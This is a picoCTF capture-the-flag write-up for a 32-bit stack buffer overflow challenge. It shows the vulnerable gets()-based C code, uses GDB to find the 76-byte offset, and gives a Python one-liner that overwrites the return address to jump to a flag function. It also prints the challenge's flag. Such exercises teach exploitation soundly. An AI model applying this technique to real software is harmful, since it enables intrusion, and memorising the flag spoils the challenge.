# OverFlow 1 - Points: 150
<b>Description : </b>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in /problems/overflow-1_0_48b13c56d349b367a4d45d7d1aa31780 on the shell server. Source.<br>
<b>Hints : </b>Take control that return address. Make sure your address is in Little Endian.
# Solved
In this cases we already see we need to solve some binary exploitation
```cpp
void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```
We already see, we need jump address into <b>flag()</b> to get flag.
```cpp
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```
To do this, im must using <b>GDB</b> Debugger in Server shell, so i note this
```
void flag() = 0x80485e6
```
I try bufferoverflow with 76 byte, still not working. Then i try to append it into 80 byte and this is what i got <b>(python -c "print 'A' * 80") | ./vuln</b>
```
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
```
Jackpot! We get the address to set into <b>flag</b> function. But before we jump into <b>flag</b> address you need struct to do that, simply code with this!
```python
import struct
print struct.pack("<I", 0x80485e6) # Flag address
```
and final result just run simple command and got flag
```
(python -c "r = 'A' * 76; r += '\xe6\x85\x04\x08'; print r") | ./vuln
``
Flag : <b>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5c0178710}</b>
